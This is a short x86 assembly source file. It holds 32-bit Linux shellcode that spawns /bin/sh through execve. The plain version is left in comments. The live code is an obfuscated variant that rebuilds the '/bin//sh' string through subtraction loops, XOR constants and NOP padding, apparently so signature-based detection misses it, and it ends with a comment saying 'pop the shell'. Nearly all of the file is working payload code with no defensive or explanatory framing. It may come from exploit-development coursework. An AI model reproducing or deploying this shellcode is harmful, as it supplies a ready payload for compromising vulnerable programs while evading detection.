[bits 32]

; xor eax, eax
; push eax
; push   0x68732f2f
; push   0x6e69622f
; mov    ebx, esp
; mov    ecx, eax
; mov    edx, eax
; xor    eax, eax
; mov    al, 0xb
; int    0x80

; exit
; xor    eax, eax
; inc    eax
; int    0x80

xor eax, eax
push eax
nop


; bulding first part of string
mov eax, 0x90906814

nop
mov ecx, 0x90900096
nop
xor ecx, 0x90900090

dec_loop1:
sub eax, 0x9090012e
nop
loop dec_loop1-6 ; -6 because of additional bytes
nop

; eax = 0x5f2d2f00
;       0x68732f2f   <- target

nop
xor eax, 0x909011bf
xor eax, 0x909026ce

; eax = 0x68732f2f
push eax
nop


; building second part of the string
mov eax, 0x90906e00

nop
mov ecx, 0x90900082
nop
xor ecx, 0x90900090

dec_loop:
sub eax, 0x909000b9
nop
loop dec_loop-6  ; -6 because of additional bytes

; eax = 0x646662fe
;       0x6e69622f    <- target

nop
xor eax, 0x9090019f
xor eax, 0x90900b41

nop
push eax

; pop the shell :D
nop
xor    eax, eax
mov    ebx, esp
mov    ecx, eax
mov    edx, eax
xor    eax, eax
mov    al, 0xb
int    0x80
